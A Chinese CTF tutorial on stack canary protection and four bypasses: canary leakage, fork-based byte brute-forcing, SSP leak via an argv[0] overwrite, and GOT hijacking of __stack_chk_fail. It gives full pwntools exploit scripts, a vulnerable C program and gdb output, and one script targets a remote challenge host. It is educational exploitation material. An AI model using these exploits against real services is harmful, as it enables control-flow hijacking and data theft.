
解析 Canary 保护机制与绕过策略

- - -

# 解析 Canary 保护机制与绕过策略

## 简介

一种防护栈溢出的保护机制；栈溢出的主要利用过程就是通过填充数据覆盖存在于栈上的局部变量，并溢出至 ebp 和 eip 等，从而劫持程序控制流；在未开启栈溢出保护的时候，可以通过覆盖返回地址来达到执行 shellcode 的目的；如果开启栈保护，在函数调用的时候 (执行时),会往栈中插入类似于 cookie 的信息，当函数返回的时候会验证 cookie 信息是否合法，即在栈销毁之前测试该值是否发生改变；如果不合法，表示栈溢出发生，会立即停止程序的执行。攻击者在利用栈溢出的时候会将该 cookie 信息覆盖掉，但程序在返回检查该值的时候能够发现发生栈溢出，故导致攻击者利用失败。

Linux 中的 Canary 和 Windows 中的 GS 都是有效缓解栈溢出的手段

**在 GCC 中开启 canary 保护**：

```bash
-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护
-fno-stack-protector 禁用保护。
```

## 原理

-   64 位程序的 canary 大小是 8 个字节，32 位的是 4 个字节；
-   **Canary 是以字节\\x00 结尾**
    
-   其原理是在一个函数的入口处，先从 fs/gs 寄存器中获取一个值，**一般**存到 EBP - 0x4(32 位) 或 RBP - 0x8(64 位) 的位置；
    
-   当函数结束时会检查这个栈上的值是否和存进去的值一致，若一致则正常退出，如果是栈溢出或者其他原因导致 canary 的值发生变化，那么程序将执行\_\_\_stack\_chk\_fail 函数，继而终止程序；
    
-   canary 的位置不一定与 ebp 存储的位置相邻，具体得看程序的汇编操作，不同编译器在进行编译时 canary 位置可能出现偏差，有可能 ebp 与 canary 之间有字节被随机填充
    

## 泄露栈中的 Canary

### 原理

**Canary 是以字节\\x00 结尾**，这样的目的是能够保证 canary 能够截断字符串；这也给泄露带来了便利，可以通过覆盖 canary 低字节来打印剩余部分的 canary。

### 条件

-   存在栈溢出漏洞
-   可以将栈中的可控变量输出

下面例子就能够达到条件：存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程

### 利用

代码：

```bash
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```

编译：

```bash
gcc -m32 -no-pie -g -o canary1 canary1.c
```

查看保护

```bash
qufeng@qufeng-virtual-machine:~/Desktop/CTF/pwn/stack/canary$ checksec canary1
[*] '/home/qufeng/Desktop/CTF/pwn/stack/canary/canary1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

首先 gdb 调试一下，由于 buf 只有 100，在 readline 发送时会加上 0a，所以这里输入的时候输入 99 个 a，这样就不会将 0a 溢出至 canary

```bash
pwndbg> stack 50
00:0000│ esp 0xffffcf30 —▸ 0xf7fb2d20 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0004│     0xffffcf34 ◂— 0x0
02:0008│ ecx 0xffffcf38 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
... ↓        23 skipped
1a:0068│     0xffffcf98 ◂— 'aaa\n'
1b:006c│     0xffffcf9c ◂— 0xd2b3ec00                         //canary
1c:0070│     0xffffcfa0 —▸ 0x804a010 ◂— 'Hello Hacker!'
1d:0074│     0xffffcfa4 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf08 (_DYNAMIC) ◂— 0x1
1e:0078│ ebp 0xffffcfa8 —▸ 0xffffcfb8 ◂— 0x0
1f:007c│     0xffffcfac —▸ 0x804936d (main+58) ◂— 0xb8
20:0080│     0xffffcfb0 —▸ 0xffffcfd0 ◂— 0x1
```

可以发现每次进程启动的 canary 值都不一样；现在需要将 canary 的值泄露出来，因为这里存在栈溢出和格式化字符串漏洞，这样可以将 canary 当作 buf 的一部分进行输出

构造 exp：

```bash
#-*- codingLutf-8 -*-
from pwn import *

context(os='linux',arch='i386',log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
p = process('./canary1')
e = ELF('./canary1')
get_shell = e.sym['getshell']
#1 leak canary
p.recvuntil('Hello Hacker!')
payload = 'a'*100
p.sendline(payload)

p.recvuntil('a'*100)
canary = u32(p.recv(4))-0xa
log.info("Canary:"+hex(canary))

#bypass canary
payload = 'a'*100+p32(canary)+'a'*8+'a'*4+p32(get_shell)
p.sendline(payload)
p.interactive()
```

首先解释为什么第一个 payload 需要输入 100 个 a，跟 gdb 调试的时候不一致？

因为 printf 碰到换行符会将缓冲区的字符输出，然后刷新缓冲区；输入 100 个 a 的原因正是将 sendline 添加的换行符溢出到 canary 的低字节，这样在 printf 输出的时候将 100 个 a 放到缓冲区后不会输出，会继续读取 canary，由于小端存储，故会将 canary 的值也添加到缓冲区，再碰到换行，输出缓冲区的内容，这也是为什么在接受到输出后会减去 0xa 得到真实的 canary(这里溢出的 0xa 占用 canary 的低字节，不会影响里面的值，**因为 canary 低字节为 00**)

为什么第二个 payload 中间需要填充 12 个 a？

观察加入 canary 后栈中的分配即可得到答案，前 8 个 a 是填充 canary 到 ebp 的 8 字节距离，而后面的 4 个 a 是填充 esp

## 爆破 Canary

### 原理

**每次进程重启的 Canary 不同，但是同一个进程中的不同线程的 Canary 是相同的，并且通过 fork 创建的子进程的 Canary 是相同的**

### 条件

与泄露 Canary 的条件一致，唯一的区别在于不存在合适的输出缓冲区字符串的函数

### 利用

查看保护：

```bash
qufeng@qufeng-virtual-machine:~/Desktop/CTF/pwn/stack/canary$ checksec bin1
[*] '/home/qufeng/Desktop/CTF/pwn/stack/canary/bin1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

分析程序：

查看 main 函数：

```bash
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  __pid_t v3; // [sp+Ch] [bp-Ch]@2

  init();
  while ( 1 )
  {
    v3 = fork();       //调用 fork 函数
    if ( v3 < 0 )
      break;
    if ( v3 )         //父进程
    {
      wait(0);
    }
    else              //子进程
    {
      puts("welcome");
      fun();          //栈溢出漏洞存在这里
      puts("recv sucess");
    }
  }
  puts("fork error");
  exit(0);
}
```

查看 fun 函数：

```bash
int fun()
{
  char buf; // [sp+8h] [bp-70h]@1
  int v2; // [sp+6Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  read(0, &buf, 0x78u);            //栈溢出漏洞
  return *MK_FP(__GS__, 20) ^ v2;
}
```

根据程序分析可以得到 buf 的大小为 100

思路：看到程序开启了 Canary 和 NX，然后程序中又有 fork 函数，可以利用爆破 Canary 来解决问题

gdb 调试查看一下 Canary 的值：

```bash
pwndbg> stack 50
00:0000│ esp 0xffffcf20 ◂— 0x0
01:0004│     0xffffcf24 —▸ 0xffffcf38 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
02:0008│     0xffffcf28 ◂— 0x78 /* 'x' */
03:000c│     0xffffcf2c —▸ 0xf7e45013 (_IO_file_overflow+275) ◂— add    esp, 0x10
04:0010│     0xffffcf30 —▸ 0xf7fb2d20 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│     0xffffcf34 —▸ 0xf7fb2d67 (_IO_2_1_stdout_+71) ◂— 0xfb3f880a
06:0018│ ecx 0xffffcf38 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
... ↓        23 skipped
1e:0078│     0xffffcf98 ◂— 'aaa\n'
1f:007c│     0xffffcf9c ◂— 0xaddaf400        //Canary
20:0080│     0xffffcfa0 —▸ 0x8048863 ◂— 0x636c6577 /* 'welcome' */
21:0084│     0xffffcfa4 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
```

继续运行，再次输入发现里面的 Canary 的值没有发生改变，这正是**通过 fork 函数创建的子进程的 Canary 与父进程是相同**

编写 exp：

```bash
# -*- coding:utf-8 -*-
from pwn import *
context(os='linux',arch='i386',log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

p = process('./bin1')
e = ELF('./bin1')

p.recvuntil('welcome\n')
canary = '\x00'

for i in range(3):
    for i in range(256):
        p.send('a'*100+canary+chr(i))
        message = p.recvuntil('welcome\n')
        if 'recv' in message:
            canary+=chr(i)
            break

getflag_addr = e.sym['getflag']
payload = 100*'a'+canary+8*'a'+4*'a'+p32(getflag_addr)
p.sendline(payload)
p.interactive()
```

如果 canary 不正确，就会输出检测到堆溢出的信息，如果 canary 正确，会输出成功信息，并继续下一字节的爆破，由于 32 位的 canary 有 4 字节，故需要爆破 3 次

```bash
[DEBUG] Sent 0x68 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000060  61 61 61 61  00 61 41 d1 //爆破的最后一步                            │aaaa│·aA·│
    00000068
```

## SSP Leak

### 原理

Stack Smashing Protect Leak，这种方法能够获取内存中的值，但是无法拿到 shell

原理参考链接：[https://www.anquanke.com/post/id/177832#h2-3](https://www.anquanke.com/post/id/177832#h2-3)

当 canary 被改变时，函数终止前会调用\_\_stack\_chk\_fail 函数，定义如下：

```bash
eglibc-2.19/debug/stack_chk_fail.c

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminatedn",
                    msg, __libc_argv[0] ?: "<unknown>");
```

故存在一种思路：当栈溢出的长度够长，足以覆盖 argv\[0\]时，就可以造成任意读

注意：下面测试时我用的 ubuntu20.04，glibc 版本为 2.31，此版本的\_\_fortify\_fail 不会输出 argv\[0\]，故在测试本地的时候需要更换 glibc 版本。

### 条件

以上条件，不能爆破，不能泄露，glibc 版本会输出 argv\[0\]

两个需要寻找的东西：argv\[0\]与栈溢出的栈顶指针的偏移量 (也可以不同，只需要在 payload 中填满泄露的地址)；需要泄露数据的地址

### 利用

地址：[https://www.jarvisoj.com/challenges](https://www.jarvisoj.com/challenges)

检查保护：

```bash
qufeng@qufeng-virtual-machine:~/Desktop/CTF/pwn/stack/canary$ checksec bin2
[*] '/home/qufeng/Desktop/CTF/pwn/stack/canary/bin2'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

查看漏洞函数

```bash
unsigned __int64 sub_4007E0()
{
  __int64 v0; // rbx
  int v1; // eax
  __int64 v3; // [rsp+0h] [rbp-128h]
  unsigned __int64 v4; // [rsp+108h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1LL, "Hello!\nWhat's your name? ");
  if ( !_IO_gets(&v3) )
LABEL_9:
    _exit(1);
  v0 = 0LL;
  __printf_chk(1LL, "Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    v1 = _IO_getc(stdin);
    if ( v1 == -1 )
      goto LABEL_9;
    if ( v1 == 10 )
      break;
    byte_600D20[v0++] = v1;
    if ( v0 == 32 )
      goto LABEL_8;
  }
  memset((void *)((signed int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));
LABEL_8:
  puts("Thank you, bye!");
  return __readfsqword(0x28u) ^ v4;
}
```

get 存在明显的栈溢出漏洞，由于 Canary 保护机制，我们也不能通过暴力和泄露来解决，继续观察发现 byte\_600D20，点击发现：

```bash
.data:0000000000600D20 byte_600D20     db 50h                  ; DATA XREF: sub_4007E0+6E↑w
.data:0000000000600D21 aCtfHereSTheFla db 'CTF{Here',27h,'s the flag on server}',0
```

从提示中可以发现这并不是真正的 flag，真正的 flag 存储在远程服务器的这个地址上。

一种思路诞生：将 argv\[0\]覆盖成 flag 地址，通过 ssp leak 来泄露。

两个步骤：寻找 flag 的地址；寻找 argv\[0\]与栈指针的偏移量

程序后半部分需要我们在 byte\_600D20 这个地址上重写 flag，故这个地址不能使用。在一些小程序中，对于这些小文本会有备份，通过 gdb 进行查找：

\*\*peda 使用 find，pwndbg 使用 search

```bash
gdb-peda$ find CTF
Searching for 'CTF' in: None ranges
Found 5 results, display max 5 items:
   bin2 : 0x400d21 ("CTF{Here's the flag on server}")
   bin2 : 0x600d21 ("CTF{Here's the flag on server}")
```

发现 0x400d21 处也存放该字字符串。

寻找偏移量：在 main 前下断点

```bash
0000| 0x7fffffffddd8 --> 0x7ffff7a2e830 (<__libc_start_main+240>:   mov    edi,eax)
0008| 0x7fffffffdde0 --> 0x0 
0016| 0x7fffffffdde8 --> 0x7fffffffdeb8 --> 0x7fffffffe210 ("/home/qufeng/Desktop/CTF/pwn/stack/canary/bin2")
```

argv\[0\]的地址为 0x7fffffffdeb8

在 get 函数前设置断点，查看此时栈顶的值：

```bash
gdb-peda$ b *0x000000000040080E
Breakpoint 2 at 0x40080e

gdb-peda$ p $rsp
$4 = (void *) 0x7fffffffdca0

偏移量：0x7fffffffdeb8-0x7fffffffdca0=0x218
```

脚本如下：

```bash
# -*- coding:utf-8 -*-
from pwn import *

context(os='linux',arch='amd64',log_level='debug')

# p = process('./bin2')
p = remote('pwn.jarvisoj.com',9877)

flag_addr = 0x400d21
payload = 'a'*0x218 + p64(flag_addr)
p.sendlineafter('your name? ',payload)
p.recv()
p.sendline()
p.interactive()

或：
payload = p64(flag_addr)*200
```

## 劫持\_\_stack\_chk\_fail 函数

### 原理

在开启 canary 保护的程序中，如果 canary 不对，程序会转到**stack\_chk\_fail 函数执行，**stack\_chk\_fail 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。利用方式就是通过格式化字符串漏洞来修改 GOT 表中的值。

### 条件

存在格式化字符串漏洞

### 利用

checksec 一波：

```bash
qufeng@qufeng-virtual-machine:~/Desktop/CTF/pwn/stack/canary$ checksec bin3
[*] '/home/qufeng/Desktop/CTF/pwn/stack/canary/bin3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

IDA 分析一波：

存在格式化字符串漏洞

```bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char format; // [rsp+0h] [rbp-60h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(*(_QWORD *)&argc, argv, envp);
  read_n((__int64)&format, 0x58u);
  printf(&format, 88LL);
  return 0;
}
```

思路：先通过格式化字符串漏洞把\_\_stack\_chk*fail 函数对应的 got 表中的值修改成后门函数地址，在通过栈溢出触发\\*\_stack\_chk\_fail 函数的执行从而触发后门函数

脚本如下：

```bash
#-*- coding:utf-8 -*-
from pwn import *
context(os='linux',arch='amd64',log_level='debug')

p = process('./bin3')
e = ELF('./bin3')

system_addr = 0x40084e
stack_chk_fail_got_addr = e.got['__stack_chk_fail']

payload = 'a'*5 + '%' + str(system_addr&0xffff-5) + 'c%8$hn' + p64(stack_chk_fail_got_addr) + 'a'*100

p.sendlineafter('It\'s easy to PWN',payload)
p.interactive()
```

system\_addr&0xffff 的含义是取后门地址的两个低字节，然后通过$hn 写入两个低字节即可。高字节部分后门函数地址和 stack\_chk\_fail 函数地址都是相同的。
